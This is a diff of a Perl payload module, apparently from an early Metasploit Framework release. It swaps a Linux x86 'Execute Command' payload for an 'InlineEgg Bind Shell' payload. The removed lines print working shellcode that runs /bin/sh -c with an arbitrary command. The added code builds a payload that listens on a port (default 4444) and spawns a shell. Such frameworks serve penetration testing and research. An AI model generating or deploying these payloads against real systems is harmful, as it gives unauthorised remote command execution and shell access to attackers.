@@ -7,59 +7,41 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::linx86_exec;
+package Msf::Payload::linux_ia32_bind_ie;
 use strict;
-use base 'Msf::PayloadComponent::NoConnection';
-use Pex::x86;
+use base 'Msf::PayloadComponent::InlineEggPayload';
+sub _Load {
+  Msf::PayloadComponent::InlineEggPayload->_Import('Msf::PayloadComponent::BindConnection');
+  __PACKAGE__->SUPER::_Load();
+}
 
 my $info =
 {
-  'Name'         => 'Linux Execute Command',
+  'Name'         => 'Linux InlineEgg Bind Shell',
   'Version'      => '$Revision$',
-  'Description'  => 'Execute an arbitrary command',
-  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
+  'Description'  => 'Listen for connection and spawn a shell',
+  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
   'Arch'         => [ 'x86' ],
   'Priv'         => 0,
   'OS'           => [ 'linux' ],
-  'Size'         => '',
-  'UserOpts'     =>
-   {
-      'CMD' => [1, 'DATA', 'The command string to execute'],
-   },
+  'Size'         => 0,
 };
 
 sub new {
+  _Load();
   my $class = shift;
   my $hash = @_ ? shift : { };
   $hash = $class->MergeHashRec($hash, {'Info' => $info});
   my $self = $class->SUPER::new($hash, @_);
 
+  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86bind_ie.py';
   $self->_Info->{'Size'} = $self->_GenSize;
   return($self);
 }
 
-sub Build {
-  my $self = shift;
-  return($self->Generate($self->GetVar('CMD')));
-}
-
-sub Generate {
-  my $self = shift;
-  my $cmd = shift;
-
-  my $shellcode =
-    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68".
-    "\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52".
-    Pex::x86::call(length($cmd)+1).
-    $cmd . "\x00".
-    "\x57\x53\x89\xe1\xcd\x80";
-
-  return($shellcode);
-}
-
 sub _GenSize {
   my $self = shift;
-  my $bin = $self->Generate('');
+  my $bin = $self->Generate({'LPORT' => '4444',});
   return(length($bin));
 }
 
